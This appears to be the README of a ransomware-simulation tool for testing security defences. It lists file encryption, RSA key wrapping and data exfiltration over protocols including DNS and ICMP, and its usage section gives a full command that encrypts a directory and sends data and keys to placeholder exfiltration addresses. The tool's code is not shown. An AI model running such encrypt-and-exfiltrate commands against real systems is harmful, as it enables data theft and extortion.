# Ransomware-Simulation

A sophisticated script for simulating ransomware behavior to test security system resilience, supporting file encryption, data exfiltration over multiple protocols, and configurable via CLI.

## Overview

This repository contains a sophisticated and secure script for simulating ransomware behavior in a controlled and authorized environment. The script is designed to help cybersecurity researchers and professionals test the resilience of their security systems against ransomware attacks, including the encryption of files and exfiltration of data.

## Features

- **File Encryption**: Encrypts files using a unique symmetric key for each file.
- **Asymmetric Key Encryption**: Secures symmetric keys using RSA encryption.
- **Data Exfiltration**: Supports multiple protocols for exfiltrating encrypted data and keys, including TCP, UDP, HTTP, HTTPS, DNS, and ICMP.
- **Exclusion List**: Allows specifying files or directories to exclude from encryption.
- **Network Transmission**: Sends encrypted keys and data to specified IP addresses and ports.
- **Configurable via CLI**: Provides a comprehensive command-line interface for specifying encryption actions, directories, and exfiltration parameters.

## Usage

1. **Install Required Libraries**:
   ```bash
   pip install cryptography dnslib requests scapy
   ```

2. **Run the Script**:
   - To encrypt files and exfiltrate data and keys:
     ```bash
     python ransomware_sim.py encrypt /path/to/test/directory --exfil-ip <exfil_ip> --exfil-port <exfil_port> --exfil-protocol <tcp|udp|http|https|dns|icmp> --key-exfil-ip <key_exfil_ip> --key-exfil-port <key_exfil_port> --key-exfil-protocol <tcp|udp|http|https|dns|icmp> --exclude-file exclude.json
     ```
   - To decrypt files:
     ```bash
     python ransomware_sim.py decrypt /path/to/test/directory --exclude-file exclude.json
     ```

## Important Notes

- **Controlled Environment**: Ensure this script is run in a controlled and isolated environment to prevent unintended data loss.
- **Legal and Ethical Use**: This tool is intended for legal and authorized testing purposes only. Ensure compliance with all relevant laws and organizational policies.
